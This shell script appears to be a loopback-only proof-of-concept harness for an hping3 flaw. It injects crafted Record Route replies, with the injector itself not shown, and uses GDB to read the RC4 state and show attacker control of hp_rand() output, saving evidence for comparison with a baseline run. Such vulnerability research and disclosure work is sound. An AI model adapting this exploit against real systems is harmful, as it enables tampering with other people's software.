#!/bin/sh
# Chosen-byte control of live hp_rand() output from a long crafted RR reply.
# Loopback only: --rand-dest 127.0.0.x probes 127.0.0.0/24 on lo.
# GDB only reads i.1, j.0 and rc4_sbox at select_next_random_dest entry.
# NO_INJECT=1 runs the baseline with no crafted frames.
set -u
cd "$(dirname "$0")" || exit 1
mkdir -p evidence
PINNED_SHA=e8ef2dd63b3f7b5e5d87d14a50bdc64c6befc94a8e21801f060708f2dcbb5e7b
FILL=${FILL:-32}
BIN=${BIN:-plain-src/hping3}
EXPECT_SHA=${EXPECT_SHA:-$PINNED_SHA}
RUN_TAG=${RUN_TAG:-attack}
[ -x "$BIN" ] || { echo "$BIN missing"; exit 2; }
sha=$(sha256sum "${BIN%/hping3}/display_ipopt.c" | cut -d' ' -f1)
[ "$sha" = "$EXPECT_SHA" ] || { echo "not expected source bytes: $sha"; exit 2; }

if [ "${NO_INJECT:-0}" = 1 ]; then tag="${RUN_TAG:-baseline}"; else tag="${RUN_TAG:-attack}-$FILL"; fi
run="evidence/rngctl-$tag-run.out"
gd="evidence/rngctl-$tag-gdb.out"
cfg="evidence/rngctl-$tag.gdb"
pidf="evidence/rngctl-$tag.pid"
sudo -n rm -f "$pidf" "$run" "$gd"
: > "$run"; : > "$gd"

sudo -n sh -c "echo \$\$ > '$PWD/$pidf'; exec '$PWD/$BIN' -D -1 -G --rand-dest -I lo -c 24 -i 1 127.0.0.x" \
    > "$run" 2>&1 &
hp=$!
pid=0
for x in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do
    [ -s "$pidf" ] && break
    sleep 0.1
done
pid=$(cat "$pidf" 2>/dev/null || echo 0)
[ "$pid" -gt 0 ] || { echo "no hping pid"; kill "$hp" 2>/dev/null; exit 2; }

mapline=$(sudo -n awk '$3=="00000000" {print $1; exit}' "/proc/$pid/maps")
base="0x${mapline%%-*}"
sb=$(printf '0x%x' $((base + 0x29e00)))
ii=$(printf '0x%x' $((base + 0x29f04)))
jj=$(printf '0x%x' $((base + 0x29f08)))
cat > "$cfg" <<EOF
set pagination off
set confirm off
file $PWD/$BIN
break select_next_random_dest
commands
silent
printf "STATE hit\\n"
x/wx $ii
x/wx $jj
x/256xb $sb
continue
end
attach $pid
c
EOF
echo "tag=$tag pid=$pid pie_base=$base fill=$FILL"

timeout 30 sudo -n gdb -q -batch -x "$cfg" > "$gd" 2>&1 &
gp=$!
sleep 4
if [ "${NO_INJECT:-0}" = 1 ]; then
    echo "NO_INJECT=1: baseline, no crafted frames"
else
    sudo -n python3 inject_rr_const.py --pid "$pid" --ptr 255 --rr-len 255 \
        --fill "$FILL" --count 3 --gap 0.15
fi
wait "$gp"
kill "$hp" 2>/dev/null
wait "$hp" 2>/dev/null

if [ -n "${EXPECT:-}" ]; then
    expect=$EXPECT
elif [ "${NO_INJECT:-0}" = 1 ]; then
    expect=baseline
else
    expect=attack
fi
python3 check_rngctl.py "$gd" "$run" --fill "$FILL" --expect "$expect" \
    > "evidence/rngctl-$tag-proof.out"
cat "evidence/rngctl-$tag-proof.out"
grep -q 'RNGCTL SUMMARY: .* PASS' "evidence/rngctl-$tag-proof.out" && exit 0 || exit 1
